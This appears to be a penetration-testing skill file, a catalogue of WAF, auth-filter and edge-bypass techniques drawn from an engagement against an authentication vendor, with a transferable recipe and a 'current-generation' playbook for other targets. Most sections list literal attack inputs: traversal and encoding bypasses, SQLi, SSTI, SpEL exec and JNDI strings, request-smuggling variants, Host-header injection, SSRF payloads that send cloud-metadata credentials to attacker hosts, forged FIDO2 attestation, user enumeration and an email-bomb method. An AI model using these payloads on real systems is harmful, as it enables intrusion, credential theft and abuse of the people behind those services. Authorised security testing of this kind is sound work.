# Bypass Catalogue — Path Filters, WAFs, Auth Walls, Header Injection, Smuggling, Traversal

Distilled from the technique variants attempted in the AcmeAuth engagement (skill-author estimate: ~145 total across the tables below — the exact count is not in the source corpus; the tables themselves are the authoritative record). Each entry has: variant (literal), target class, outcome, and root-cause explanation. The aim is not to celebrate what worked — it's to **prevent repeating what was already proven dead** on a similar stack. §O (O0–O8) is the post-engagement extension: the current-generation battery, marked open unless a corpus tie is noted — its outcomes land in the differential matrix (§O8) and [killed-hypotheses.md](killed-hypotheses.md), not in the instance tables.

## Outcome legend
- **WORKED** = confirmed live exploit
- **BLOCKED** = edge WAF/ALB rejected
- **4xx-no-sink** = reached app layer but no vulnerability
- **PARTIAL** = primitive obtained, not escalated

---

## §0 Generic bypass recipe (transferable — read this before the tables)

The tables in §A–§N are the **instance layer** (literal variants + outcomes on one stack). The method below is the **recipe layer** — it applies to any target. Run the recipe; use the tables to recognize patterns and to avoid re-running what a similar edge already killed.

1. **Fingerprint the edge before attacking it.** Send deliberately-malformed requests and read the rejection envelope: a gateway-reject (`{"detail":"Ensure the URL is valid","type":"...InternalServerErrorException.html"}`-style uniform 403) is a different opponent than an origin 400 (framework parser) or an SPA fallback (200 + `text/html`). Record the exact envelope for each layer — every later result is classified against it.
2. **Run the ordered ladder cheapest-first** (§A's ladder is the canonical ordering: path-confusion headers → suffix/trailing tricks → matrix params → single-encode → double-encode → traversal → case → overlong/multibyte). One variant per request, no batching — you need per-variant attribution.
3. **Classify every outcome against the four-way discriminator:** edge-reject (uniform 403 envelope) / origin-reject (400/415 with framework signature) / SPA fallback (200 HTML, `405` on non-GET, `index.html` title) / controller reach (200 + JSON data or operation-confirmed). Only controller reach counts as a bypass; SPA fallback is cosmetic.
4. **Infer the defense mechanism from response uniformity.** All-403-identical = centralized filter (look for adjacent unfiltered namespaces); mixed 400/403 = per-endpoint annotations; a single 200-with-data among a 403 class = the finding (see [http-auth-filter-testing.md](http-auth-filter-testing.md) §1 for the 78:1 method).
5. **Never trust a bypass that only changes the status code.** Confirm data or state change, and re-run with a negative control (random nonexistent resource) so rate-limit/IP-reputation artifacts don't masquerade as differentials.
6. **Record negatives at variant granularity** (`variant → outcome → why`). The tables below are valuable precisely because each BLOCKED row carries the root cause; "tried X, blocked" without "why" is not reusable.

---

## A. Path-filter / path-normalization bypass (20+ variants)

The single most-tested class. Tested against AcmeAuth's path-based auth filter (deployed 2026-07-23/24 to kill F5/F7/F9) and the SCG actuator block.

### Ordered ladder (cheapest discriminating signal first)

Run [path-bypass-fuzzer.sh](../scripts/path-bypass-fuzzer.sh) for the full battery. Order:

1. **Path-confusion headers** — `X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-For`, `X-Real-IP`, `X-Forwarded-Host`, `Forwarded`, `X-Original-Host`, `X-Host`, `X-Forwarded-Prefix`
2. **Suffix tricks** — `.json`, `.html` (Spring MVC suffix-matches to GET-only → `POST /x.json` returns 405; informational only)
3. **Trailing dot / slash / whitespace** — `/x.`, `/x/`, ` /x`, `/x%20`
4. **Semicolon / matrix params** — `/x;.json`, `/x;jsessionid=y`, `/x;.html`
5. **`@` separator, null byte** — `/x@`, `/x%00`
6. **Single-encode** — `%2f` (`/`), `%2e` (`.`), `%61ctuator`
7. **Double-encode** — `%252f`, `..%252f`, `.%2e/`
8. **Path traversal literals** — `../`, `..//`, `..;/`, `....//`
9. **Tab / control char** — `%09` (works for Go `url.Parse` oracle; useless on Java WAF)
10. **Case variation** — `/ACTUATOR/env`, `/cc/Idp/...`
11. **Overlong UTF-8 / fullwidth / WEB-INF / META-INF** — `..%c0%af..`, `%ef%bc%8f`, `/WEB-INF/web.xml`

### AcmeAuth-specific results

| Variant | Target | Outcome | Why |
|---|---|---|---|
| `/ENV`, `/Env` (case-variant) | `/env` | BLOCKED (403) | WAF normalizes case for `/env`-class paths |
| `/env/`, `/env;.`, `/env%20` (trailing) | `/env` | BLOCKED (403) | WAF matches normalized form |
| `/env%00` (null byte) | `/env` | 400 (nginx) | nginx rejects null byte in URI |
| `/env%2e`, `/env%2f`, `/env%3b` (encoded) | `/env` | BLOCKED (403) | decoded then matched |
| `/%65nv` (single-char encode) | `/env` | BLOCKED (403) | WAF decodes `%65`→`e` |
| `/env;.js`, `/env;jsessionid=x` (matrix) | `/env` | BLOCKED (403) | WAF strips matrix before match |
| `/env..;/`, `/aaa/../env` (relative traversal) | `/env` | BLOCKED (403) | normalized |
| `//env`, `/./env`, `/;/env`, `/.env` | `/env` | BLOCKED (403) | all normalized |
| `/cc/..;/actuator`, `/cc/..;/actuator/env` | actuator | 400 (reached Spring, rejected malformed) | `..;` bypasses SCG block but Spring rejects path — confirms Spring Boot behind gateway |
| `/cc/api/email/send/template%252f` (double-encode) | SSTI target | 400 | decoded to `%2f`, rejected |
| `.json`/`.html` suffix | admin sinks | 405 (path-aware) / 403 | Spring suffix-match routes to GET-only; POST execution not reached |
| **Case-variant on patched IdP endpoints** | F5/F9 patched sinks | **PARTIAL — bypasses WAF path filter** (returns 200 SPA HTML / 405) but **NOT exploitable**: Spring MVC case-sensitive, uppercase segments miss `@RequestMapping`, fall through to SPA static handler. No controller logic runs. | WAF regex case-sensitive; Spring routing saves it. Cosmetic gap only. |

**Net verdict:** every normalization/encoding bypass blocked by WAF or rejected by Spring. The single case-variant gets past the filter but Spring's case-sensitive routing neutralizes it.

### Discriminating SPA fallback from controller reach

SPA fallback serves Angular `index.html` (HTML, GET-only → 405 on POST/DELETE), title `"Error | <app>"`. A real controller hit returns JSON with the expected error envelope (`type: /static/docs/jakarta/...`). **The 405-on-non-GET is the cleanest discriminator.**

---

## B. Header injection

Tested against `/cc/api/email/send/template` (SSTI target) and `/actuator/env`.

| Header variant | Target | Outcome | Why |
|---|---|---|---|
| `X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-For`, `X-Real-IP` (singly + combined) | SSTI target | 401 | No IIS/nginx path-confusion; nginx routes by Host, doesn't honor these |
| `Host: localhost`, `Host: 127.0.0.1` | `/actuator/env`, admin sinks | 404 | nginx vhost routing — request never reaches Spring |
| `X-Forwarded-Host`, `Forwarded`, `X-Original-Host`, `X-Host`, `Referer`, `X-Internal`, `X-Authenticated`, `X-User`, `X-Remote-User`, `X-Roles` | SSTI target | 401 | None trusted by auth layer |
| `X-HTTP-Method-Override`, `X-Method-Override`, `?_method=` (method override) | SSTI target | 401 | Auth is path-based, not verb-based |
| **`Host: evil.attacker.com` (F18, on Keycloak IdP Redirector)** | `/auth/realms/master/.well-known/openid-configuration` + 11 other IdP paths | **WORKED** (CVE-2024-28887 pattern) | Keycloak builds Okta authorize URL from inbound Host with no validation → `redirect_uri=https://<attacker>/oauth2/idpresponse` reflected in 302 Location; Okta then reflects it into CSP `frame-ancestors`. All 7 CC tenants affected. Downgraded to Low/3.2 because vanilla browser cannot set Host — needs intermediary/AC:H. |

**When Host-header injection actually works:** only when an intermediary (corporate forward proxy, cache, downstream CDN, misconfigured reverse proxy) **forwards the attacker-supplied Host to the origin**. Direct browser-to-origin traffic cannot exploit it. AC:H is correct.

### Host-header testing negative set (all dead ends against AcmeAuth nginx)
- `Host: localhost/127.0.0.1/169.254.169.254/metadata.google.internal/admin/api/backend/spring-admin/actuator.cdn.acmeauth.example` → all nginx 404 (nginx routes by Host, doesn't reach Spring)

---

## C. HTTP request smuggling

| Variant | Transport | Target | Outcome | Why |
|---|---|---|---|---|
| CL.TE (Content-Length + Transfer-Encoding: chunked) | raw TLS socket | CC hosts | BLOCKED (400/501) | Edge nginx canonicalizes Transfer-Encoding |
| TE.CL | raw TLS socket | same | BLOCKED | nginx rejects ambiguous headers |
| TE.TE obfuscation (`Transfer-Encoding: xchunked`, double-spaces, mixed-case) | raw TLS socket | same | BLOCKED | nginx rejects |
| TE-folding | raw TLS socket | same | BLOCKED | — |
| CL-CL-duplicate (two Content-Length headers) | raw TLS socket | same | BLOCKED | nginx rejects duplicate Content-Length |

**Net:** No smuggling primitive — nginx canonicalizes/rejects every ambiguous-header variant before the backend.

---

## D. Path traversal

| Variant | Target | Outcome | Why |
|---|---|---|---|
| `/static/../etc/passwd`, `..%2f`, `....//`, `..;/actuator/env` | `/static/*` | BLOCKED/sanitized | WAF or resource handler |
| `%2e%2e%2f` on `/rp/oob/device/authentication/requests/cancel/{sessionId}` | `/rp/oob/*` | nginx 403 | path-traversal signature at URL parser |
| fullwidth `/` (`%ef%bc%8f`), overlong UTF-8, `..%252f`, null byte, semicolon (F23 WAF-bypass set) | Affirm `workflowId` upstream CC path | BLOCKED (WAF 403) | Upstream WAF blocks every traversal needed to redirect proxy to different CC endpoint — only hardcoded upstream reachable |
| overlong UTF-8 `..%c0%af..` (Tomcat unicode) | `/login` etc. | 400 | Tomcat rejects overlong UTF-8 |
| `/cc/ui;/etc/passwd` (matrix-var traversal) | `/cc/ui/*` | 400 | Spring rejects malformed path |
| 15 traversal variants (double-encode, `..;/`, overlong UTF-8, null byte, fullwidth, `WEB-INF`, `META-INF`) vs `/static/docs/**` | `/static/docs/**` | BLOCKED | front WAF |

**Net:** No traversal primitive anywhere on the edge; Tomcat/Spring reject overlong/matrix forms at the parser.

---

## E. SQLi (time / error / boolean across MySQL/PG/MSSQL/Oracle/SQLite)

| Class | Literals attempted | Target | Outcome | Why |
|---|---|---|---|---|
| **Time-based** — MySQL `SLEEP(5)`, `BENCHMARK(...)`, versioned hint `/*!50000SLEEP*/`; PG `pg_sleep(5)`; MSSQL `WAITFOR DELAY '0:0:5'`; case-fold `AdMiN'+SlEeP(5)+'`; inline-comment `/**/`; newline `%0a`; whitespace `%20` | `uid` param, FIDO2 `username`/`displayName`, audit `sortBy/orderBy/filter/q/search` | BLOCKED (WAF 403 ~0.75s, no delay) | WAF blocks time primitives pre-app; backend uses parameterized JPA |
| **Error-based** — `extractvalue()`, `updatexml()`, double-query, `cast`/`convert` | FIDO2 fields, `uid` | no SQLException signature | parameterized queries |
| **Boolean-based** — `' OR '1'='1`, `' OR '1'='2`, `' UNION SELECT 1--`,  `" OR "1"="1` | `uid` (12 distinct usernames incl. negative control), FIDO2 `username` | no size/status differential | ORM parameterization; no existence oracle |
| **SCIM filter injection** — 23 payloads incl. `userName eq "admin"`, UNION, stacked, time-based, JNDI `${jndi:ldap://x}`, SSTI `{{7*7}}`, cmd-sub `$(whoami)`, `` `whoami` `` | `/cc/api/<x>?filter=` on every CC host | byte-identical 400/116 `InvalidRequestParamProblem` for ALL 23 | global static edge `filter`-validator — no parser to inject into |
| bare quotes, backslash, `*`, `%`, `${jndi:ldap://x}`, `{{7*7}}`, `%00` | `uid` | identical 200/86-byte baseline | `uid` is non-interpolated lookup key (K/V or document store) |

**Net:** Negative across every DB dialect. WAF normalizes case/comments; backend fully parameterized; the only unauth JSON endpoint with a free-form field has no oracle.

---

## F. SSTI (Thymeleaf / Freemarker / Jinja / Velocity / ERB)

| Variant | Target field | Outcome | Why |
|---|---|---|---|
| Thymeleaf `#{7*7}` | FIDO2 `displayName` | reflected raw, `49` never appears | no template engine on response path |
| Freemarker `${"freemarker"?eval}` | displayName | reflected raw | — |
| Jinja `{{7*7}}` | displayName | reflected raw | — |
| Velocity | displayName | reflected raw | — |
| ERB | displayName | reflected raw | — |
| `{{7*7}}${7*7}` into `POST /logs` | logs body | 204 accepted (stored) but no reflection path reachable | `/logs` output unverifiable from unauth perimeter; if rendered unescaped in CC UI = stored XSS, if backend-evaluated = blind SSTI — sink unconfirmed |
| candidate sink `/cc/api/email/customizations/*` (email template render) | — | 401 admin-gated | cannot reach without CC admin session |

**Net:** Negative. No template engine on any unauth response path; the plausible sink (email customizations) is admin-gated.

---

## G. Jackson polymorphic deserialization

Confirmed Jackson parser on `/fido2/attestation/result` via malformed-JSON error signature.

| Variant | Target | Outcome | Why |
|---|---|---|---|
| `AbstractBeanFactoryPointcutAdvisor` gadget | `/cc/api/integrations/adapt/events/test`, `/cc/api/jobs/scheduler/update/config`, `/cc/api/email/send/template` | 400 (validation) / 403 (role check) | — |
| `JdbcRowSetImpl` gadget (JNDI) | `/fido2/attestation/result` + above | `InvalidJSONRequestProblem` (400) | Jackson default typing disabled |
| `TemplatesImpl` gadget | same | 400 | — |
| `@class` / `@type` trigger | same | 400 | no polymorphic deser |
| UUID array-typing deser confusion | `/fido2/attestation/result` | 400 | — |

**Net:** No `ClassNotFoundException` or deser-specific signature — Jackson default typing is off; SESSION cookie is a Spring-Session UUID pointer (no client-side Java deser surface).

---

## H. SpEL injection

| Variant | Target | Outcome | Why |
|---|---|---|---|
| `#{T(java.lang.Runtime).getRuntime().exec(...)}` | FIDO2 `username`/`displayName` | reflected raw, no eval | SCG does not run SpEL on request bodies |
| `${...}`, `*{...}`, `{{...}}` wrappers | same | reflected raw | — |
| `/cc/api/integrations/adapt/events/test` `logLevel` field containing `${}`/`#{}`/`<>"'&\|;:=%*()?` | adapt events test | 400 for ANY value containing those chars | Jakarta `@Pattern("^[^{}<>&\|;:=%*()?]*$")`-style input sanitization — **NOT** SpEL/Log4Shell eval (verified char-by-char) |
| Spring Cloud Function CVE-2022-22963 — `/functionRouter` with `spring.cloud.function.routing-expression` header | SCF | 403 from ALB (`awselb/2.0`) | request blocked before backend |

**Net:** Negative. No SpEL engine on the request path; the apparent `${}`/`#{}` rejections are input-validation regex, not evaluation.

---

## I. WAF bypass techniques (IP/encoding obfuscation)

| Technique | Literal form | Target | Outcome | Why |
|---|---|---|---|---|
| decimal IP | `http://192.0.2.1/...` | Affirm `workflowId` upstream | BLOCKED | WAF blocks host-rewrite primitives |
| hex IP | `http://0xc0000201/...` | same | BLOCKED | — |
| fullwidth `/` | `%ef%bc%8f` | F23 upstream path | BLOCKED | — |
| overlong UTF-8 | `..%c0%af..` | `/login` | 400 | Tomcat rejects overlong |
| null byte | `%00` | `/env` (400 nginx), F23 (blocked) | BLOCKED/400 | — |
| semicolon | `;` matrix-param, `/env;`, `/cc/basic/token;jsessionid=x` | `/env`, `/cc/basic/*` | 403 (WAF) / 400 (Spring matrix parser) | — |
| double-encode `..%252f` | `..%252f`, `%252f` | F23, `/cc/api/email/send/template%252f` | BLOCKED/400 | decoded once to `%2f`, blocked |
| WAF case-fold bypass attempts | `AdMiN'+SlEeP(5)+'`, `/ENV` | `uid`, `/env` | BLOCKED (403) | actively maintained ruleset; normalizes case, inline comments, versioned hints, newline/whitespace |

**Net:** Every documented WAF-bypass technique was blocked. No known bypass.

---

## J. CVE attempts (only ones actually tested)

| CVE | Technique | Target | Outcome | Why |
|---|---|---|---|---|
| **CVE-2022-22947** (SCG actuator RCE) | `/actuator/gateway/routes`, `/actuator/gateway/refresh` + 20 sibling endpoints + 20 path-normalization bypasses + headers | all SCG hosts | BLOCKED (403/400) | SCG own actuator endpoints firewalled; `/cc/..;/actuator` bypasses SCG but Spring rejects malformed |
| **CVE-2022-22963** (SCF SpEL) | `/functionRouter` + `spring.cloud.function.routing-expression` header | SCF | 403 from ALB (`awselb/2.0`) | blocked before backend |
| **CVE-2022-22965** (Spring4Shell) | `class.module.classLoader...` headers on `/login` | `/login` | no reflection; response unchanged | no class-binding DataBinder surface |
| **CVE-2018-1273** (Spring Data RCE) | SpEL in form parameter | — | 302 → accessDenied | — |
| **CVE-2024-28887** (Keycloak host-header SSRF) | `Host: evil.attacker.com` on `/auth/realms/master/*` | Keycloak IdP on all 7 CC tenants | **WORKED (F18)** | see B |
| **CVE-2024-8626** (Keycloak user enum) | (in affected range for KC 24.6.1) | `/auth/admin/*` | not weaponized (REST API 401; console UI only) | noted, not exploited |
| **CVE-2022-2193** (AcmeAuth FIDO2 IDOR — "add FIDO2 authenticator to arbitrary accounts") | unauth `POST /fido2/attestation/options` + `/fido2/attestation/result` with `username:admin@acmeauth.example`, forged `fmt:none` CBOR attestation | pentesting2, tenant-002 (shared DB) | **WORKED → F13 CRITICAL** | v6.14.1 fix did not close the unauth attestation flow on v11.3.0; 130→131→132 creds persisted cross-tenant. ATO completion blocked by per-rpAppId binding (`AcmeAuthDefaultApplication` hardcoded, `controlCenterAdmin` rejected). |
| **CVE-2022-2192** (AcmeAuth magic-link path tampering) | `/cc/basic/magiclink/admin`, `/cc/ui/rpUser/{appId}/recover` | CC | 403/302 | admin-gated |
| **CVE-2024-8273** (AcmeAuth identity spoofing) | `/rp/api/versioned/magiclink` | RP | 401 | fixed |
| **CVE-2023-1837** (AcmeAuth Legacy API auth bypass <8.0) | `/rp/api/versioned/rpUser/*`, `/rp/wsapi/*` (15 endpoints), `/AcmeAuth/rest/conformance/{Get,Send/Reg,Send/Auth}` | RP / conformance | 401; conformance returns only FIDO2 test scaffolding | all tenants ≥11.1.0; vuln class N/A |
| **CVE-2026-2414** (AcmeAuth IDOR, CVSS 9.8 CWE-639) | variant hunting across all non-idp `/cc/api/*` controllers (453-path GET + 342-path POST/PUT/PATCH/DELETE scan) | `/cc/api/*` | no missing-`@PreAuthorize` defect reachable without session | — |
| **CVE-2021-44547** (Pritunl auth bypass) | `/api/server`, `/api/user`, etc. | vpn-pritunl.acmeauth.example | 404 | patched or API stripped |
| **CVE-2023-33831** (Pritunl unauth reset) | `/reset/...`, `/password/reset` | vpn-pritunl | 404 | — |

CVEs NOT attempted (watchlist): **CVE-2024-38821 (WebFlux), CVE-2024-38816 (RouterFunctions), CVE-2024-22243 / CVE-2024-22259 / CVE-2024-22262 (UriComponentsBuilder)**. See [cve-watchlist.md](cve-watchlist.md).

---

## K. SSRF chaining (the cluster that WORKED — C1/C2/C3/C4 + F23)

| Sink | Vector | Egress / UA | Outcome | Defense gap |
|---|---|---|---|---|
| `POST /cc/ui/integrations/adapt/policies/policy_evaluation/test` (C1) | Rego `http.send({"method":"GET","url":"https://<attacker>"})`; full `result.resp.raw_body`/`body`/`headers` returned | Adapt worker, `Go-http-client/2.0`, `98.93.120.50` | **WORKED (Critical)** — remediated 2026-07-26 | OPA `http.send` enabled in tenant-controllable test path, no URL allowlist, body returned to client |
| `POST /cc/ui/token` `type=OAUTH_CLIENT_CREDENTIALS` field `jwksUrl` (C2) | `"jwksUrl":"https://<attacker>/latest/meta-data/iam/security-credentials/"` | `Java/17.0.17`, `52.2.185.255` (AWS us-east-1); fetch fires even on 400 | **WORKED (Critical)** — remediated | validation-phase fetch with no host whitelist |
| `POST /cc/ui/idv/oidc` field `jwksUrl` (C4) | `"jwksUrl":"https://webhook.site/<uuid>/jwksUrl"` | same Java/17 egress `52.2.185.255`, **separate controller** | **WORKED (Critical)** | independent code path from C2 — multiple `jwksUrl`-fetch sites need separate patching |
| `PUT /cc/ui/integrations/eventhooks/{name}` field `invocationEndpoint` (C3 part A) | `"invocationEndpoint":"https://webhook.site/<uuid>/full","authType":"BASIC"` | AWS EventBridge `Amazon/EventBridge/ApiDestinations`, `44.214.10.90`, POSTs audit JSON | **WORKED (Critical)** | EventBridge destination created with no SSRF-safe validation |
| `POST /cc/ui/serverconfig/proxy/verify` (C3 part B) | `{"proxies":[{"protocol":"http","host":"<attacker>","port":"80"}]}` used as HTTP proxy to google.com | AcmeAuth CC server | **WORKED** — downstream HTTP error body embedded in `errorMsg`; stack leaks `ServerProxyConfigService.kt:167` | raw upstream body reflected in API error |
| `GET https://verify.acmeauth.example/api/workflow-results?workflowId=<X>` (F23 Affirm) | `workflowId=:8080/admin` (SSRF to upstream CC, 200 + login HTML proving authenticated upstream); `workflowId=%09` (control-char 500 leaks URL template `https://tenant-demo.cdn.acmeauth.example/cc/api/idv/workflow/{workflowId}/results`) | Go `url.Parse` on string-interpolated URL | **WORKED (High→Medium 5.2)** | naive string interpolation of `workflowId`; only hardcoded upstream reachable (WAF blocks every traversal variant) |
| **F8 install-token infinite mint** (dormant persistence primitive) | `POST /cc/install/token/exchange` with install-token in body → fresh `hypws-` (long-lived) + `hypwo-` (89-day WORKSTATION) bearer; 6 independent mints across 2026-07-23/24/26 (incl. `hypwo-81184668-`, `hypwo-42288d91-`) confirmed the surface is unchanged by the 2026-07-23/24 patch | pre-issued install-token (per-tenant, NOT attacker-mintable); token itself is the persistence primitive | **WORKED (Medium 5.4 — dormant)** — surface unchanged; downstream IdP cluster (F5/F7/F9) closed → token currently reaches only `/rp/versioned/features` (benign config) | persistence primitive: the credential survives future authz regressions; treat as live even when no current chain exploits it (see [cvss-scoring-methodology.md](cvss-scoring-methodology.md) Pattern 5) |

**Escalation attempts against the SSRF primitives (all blocked):**
- `opa.runtime()` env leak + `unix://` socket SSRF escalation for C1 — untestable (C1 remediated)
- redirect-to-metadata for C2/C4 — edge WAF blocks RFC1918/metadata
- F23 redirect to alternate CC endpoint — every traversal variant blocked (see I)

---

## L. Authorization bypass (F5/F7/F9 — WORKED then remediated)

The "technique" here is privilege-tier escalation, not payload obfuscation. WORKSTATION-scoped Bearer (`hypwo-`, lowest-privilege device credential) reaching admin controller logic. 9 IdP/support endpoints, root cause = missing `@PreAuthorize`.

| Endpoint | Operation | Outcome |
|---|---|---|
| `GET /cc/api/acmeauth/idp/integrations/configured` | read plaintext `keycloakSecret` for all SSO integrations (F5) | **WORKED** → patched 2026-07-23/24 → 403 `Ensure the URL is valid` |
| `GET /cc/api/idp/integration/enablement` | read SSO state | **WORKED** → 403 |
| `POST /cc/api/idp/suspend/{provider}` | suspend SSO (`isSuccessful:true`) | **WORKED** → 403 |
| `POST /cc/api/idp/qr/setQR` | modify QR config | **WORKED** → 403 |
| `GET /cc/api/support/allowed?email=X` | always `isAllowed:true` | **WORKED** → 403 |
| `DELETE /cc/api/idp/integration/{provider}?rpAppId=X` | **permanently delete SSO** (F9, destructive) | **WORKED** → 403 |
| `/cc/api/idp/fido2/{ssoNonce,creationOptions,device}` | reach biz logic | reached (500/400) — partial; no full chain; validation 400 unchanged post-patch |

**Token-type verification (F7):** `hypwo-` and `hypws-` both bypass; random UUID → 401; no token → 401. Validated against 246 `/cc/api/` + ~180 `/rp/` endpoints — only the 9 IdP/support endpoints were unprotected.

---

## M. FIDO / FIDO1 / FIDO2 credential injection (WORKED)

See [fido-webauthn-testing.md](fido-webauthn-testing.md) for full flows and CBOR PoC.

| Vector | Literal | Outcome |
|---|---|---|
| **F13 unauth FIDO2 attestation** (pentesting2/tenant-002 shared DB) | `POST /fido2/attestation/options {"username":"admin@acmeauth.example",...}` → real challenge + 130 existing `excludeCredentials`; then `POST /fido2/attestation/result` with forged `fmt:none` CBOR attestation → `{"status":"ok",...}`; count 130→131→132 cross-tenant. rpAppId mass-assignment (override to `controlCenterAdmin`) also tested. | **WORKED (Critical, strict 9.1)** — credential persisted; ATO completion blocked by per-rpAppId binding. Original submission scored 9.8 with A:H; strict re-scoring gives A:N → 9.1 (still Critical). See [cvss-scoring-methodology.md](cvss-scoring-methodology.md) F13 worked example. |
| **F22 unauth FIDO1 UAF** (`/rp/fido/get`) | `op=Reg` `userName:admin@acmeauth.example` `sessionId:attacker-controlled-001` → 200 "Registration Success", challenge bound to victim, sessionId echoed verbatim (session-fixation); `op=Dereg` → 200; `op=Auth` → uncaught 500 `InternalServerErrorException` (UUID leak); negative control `zzznonexistent...@nowhere.com` also 200 | **WORKED (High 7.3)** — state injection + session fixation + DoS amplifier; `/rp/fido/send/reg` TLV validation blocks credential completion |
| **F12 size/timing enumeration oracle** (`POST /fido2/assertion/options`) | `{"username":"admin@acmeauth.example",...}` (exists) → **11740 B** response w/ `allowCredentials` array, ~600 ms TTFB; `{"username":"nobody@xyz.com",...}` (absent) → **245 B** response, ~350 ms TTFB. **47.9× size ratio + ~250 ms timing delta.** Tenant toggle (7 of 11 tenants return generic error — mitigated; 4 of 11 still leak). | unauthenticated FIDO2 assertion-options endpoint; response-size and TTFB both leak user existence | **WORKED (Medium 5.3)** — usable for user enumeration against the 4 unmitigated tenants; full PoC in [fido-webauthn-testing.md](fido-webauthn-testing.md) (F12 section) |

---

## N. Other injection / miscellany

| Category | Literal | Target | Outcome |
|---|---|---|---|
| CORS reflection | `Origin: https://evil.example.com` on `/cc/basic/token`, `/cc/ui/token`, `/cc/ui/serverconfig/global` | no ACAO/ACAC reflection | not vulnerable |
| Content-Type / XXE | XML/text-yaml/cbor/x-www-form-urlencoded CTs on `/cc/api/email/send/template` | 400 / 415 | no XXE surface |
| CRLF / log-forging | `\r\n[FORGED] ...` in `POST /logs` | 204 accepted | log-injection sink (unverifiable) |
| XSS / SVG | `<script>` in SVG upload to `/cc/api/email/assets/upload`; `<script>` in FIDO2 displayName | 400 | blocked |
| Direct OPA REST | `/v1/data`, `/v1/query`, `/v1/compile`, `/v1/config` | Spring 400 (wildcard route, not OPA) | not actual OPA endpoints |
| JAX-RS/CXF | `/services`, `/cxf`, `/cc/services` | 403 / 302 | not exposed |
| Sentry DSN event injection (F21) | POST envelope to `o4504997465817088.ingest.sentry.io` with attacker event | **WORKED (Low)** | by-design public DSN, no inbound filtering |
| **F24 reCAPTCHA bypass + unbounded email-bomb** (`POST https://verify.acmeauth.example/api/send-code`) | `{"email":"admin@acmeauth.example","recaptchaToken":""}` → **200 "Verification code sent"**. Bypass logic: `email.toLowerCase().endsWith('@acmeauth.example')`. 18-variant test matrix: empty/missing/dummy/500-char tokens all accepted for `*@acmeauth.example`; subdomain (`test@x.acmeauth.example`), case-tricks, null-byte, `acmeauth.examplex`, `acmeauth.example.au`, `acmeauth.example.evil.com` all correctly rejected → not an open relay, but an **unbounded email-bomb against AcmeAuth corporate mailboxes** (`admin@`, `support@`, `info@`, …). 6 sequential POSTs → 6× 200, no `429`, no `Retry-After`, no `X-RateLimit-*`. Companion `/api/verify-code` DOES rate-limit (2 fails → "Too many failed attempts") but `/api/send-code` does not. | `verify.acmeauth.example/api/send-code` (AcmeAuth Affirm) | **WORKED (High 7.3 → Medium per strict re-score)** — phishing-precursor: pre-fill victim email, trigger branded AcmeAuth mail, follow up with SE referencing the legitimate code. Particularly embarrassing for a vendor selling anti-phishing. Full 18-variant PoC in [http-auth-filter-testing.md](http-auth-filter-testing.md) §8. |

---

## O. Edge-layer bypass — the current-generation playbook (O0–O8)

§A–§N record what the last engagement's edge killed. §O is the **current-generation battery**: techniques that work against actively-maintained edges because they target *parser and pipeline disagreement* between components, not payload obfuscation. Corpus ties are marked where they exist — the AcmeAuth edge already published its normalization set in §A/§I and its dead TE.TE ladder in §C, and both are inputs here. Everything else is an **open battery**: outcomes land in the differential matrix (§O8) and negatives in [killed-hypotheses.md](killed-hypotheses.md).

### O0 Deformation probes — map before you fire

Firing payloads at a maintained edge is how you get blocked and learn nothing. O0 buys, with cheap and harmless requests, the information that makes every later payload count.

**Normalization fingerprint.** Take one definitely-blocked path and one definitely-allowed path; send each through the O1 deformation set **with no payload at all**. Record a response hash per (variant, path). Deformations that collapse to identical hashes are canonicalized by the edge — cross them off. Deformations producing distinct responses are parser disagreements: the only cells that deserve real payloads. Corpus tie: §A/§I *is* a partial normalization fingerprint — the edge normalizes case, matrix params, single encoding, comments, versioned MySQL hints (all BLOCKED), while case-variation survived to the origin (PARTIAL). That one PARTIAL cell was the entire map; O0 obtains it in advance for free.

**404-vs-403 routing-table mapping.** The filter's position in the pipeline leaks through nonexistent paths:
- `/blocked-nonexistent` → **403**: the filter matches raw path prefixes pre-routing (blocklist model). Header- and path-shape deformations (O1 #1/#2/#6) are your surface.
- `/blocked-nonexistent` → **404**: the filter evaluates only *resolved* routes (routing-aware model). Route-resolution deformations (O1 #4/#5/#8) are your surface; raw-path deformations are dead.
Probe the boundary explicitly: `/exists/../nonexistent`, `/nonexistent/..`, `/exists/.`, `/exists%2f.`, `/exists/./` — where the 404/403/400 line sits per deformation tells you which component collapses dot-segments and empty segments, and when.

**Timing fingerprint — rule-set generation.** Rule engines can add processing cost as rules are traversed. Compare deformations whose only difference is the number of known rule-pattern substrings they contain (`union`, `select`, `../`, `${`, `<svg`) and take median TTFB over repeated samples, interleaving fixed-size baseline requests as the jitter control. A consistent timing step between variants is a hypothesis about rule coverage or evaluation order; a differential inside the jitter baseline does not support that inference.

**FP trap (hard):** CDNs and anycast POPs normalize and cache too — a differential may be one POP's cached normalize-and-serve. Re-test every O0 result with a unique cache-buster (`?cb=<rand>`); only buster-surviving differentials are origin behavior. Re-run the full battery from a second egress IP before believing a timing fingerprint.

**Passive fingerprinting — zero requests to the app.** Before even O0's probes, the edge identifies itself: h2 `SETTINGS` frame values + `WINDOW_UPDATE` sizes and pseudo-header order (h2 fingerprinting pins the edge stack — Cloudflare/ALB/Envoy/nginx each have distinctive defaults), TLS JA4/JA3 + ALPN offer order, CT-log issuer (which CA signs which edge), CNAME chains (`*.cdn.dnsv1.com`-style chains name the CDN), and response header case/order quirks. Cheap, invisible, and it narrows which O1/O2 vectors are even plausible for this stack before a single deformation is sent.

**Unknown-verb probe.** `PROPFIND`, `TRACE`, `CONNECT`, and a custom verb (`ZPROBE`) against blocked and allowed paths: matchers anchored on well-known methods never cover custom verbs, and 501/405/200 answers per verb fingerprint whether verbs are filtered pre- or post-routing. This is also the §O4 entry point.

### O1 The differential classics (8 — each: variant, discriminating signal, per-variant negative control)

| # | Variant | Discriminating signal | Per-variant negative control |
|---|---|---|---|
| 1 | **Backslash separator** — `/blocked\suffix`, `/api\blocked` | Jetty/Tomcat/IIS treat `\` as a separator in specific positions; nginx/ATS do not. 403→200 flip = edge matcher reads `\` as literal, origin router splits on it | Same `\` on a guaranteed-nonexistent path (must stay 404-identical) and on the blocked path's allowed sibling |
| 2 | **Semicolon asymmetry** — `/blocked;x=y`, `/;/blocked`, `/blocked;/` | Tomcat strips path-parameters pre-routing; most edge matchers see the raw path. Flip = the components disagree about where parameters end. §A instance: `/cc/..;/actuator` passed SCG, Spring rejected — the signal is *which layer strips* | `/allowed;x=y` must behave exactly like `/allowed` — if it doesn't, the edge parses `;` too and the variant is dead here |
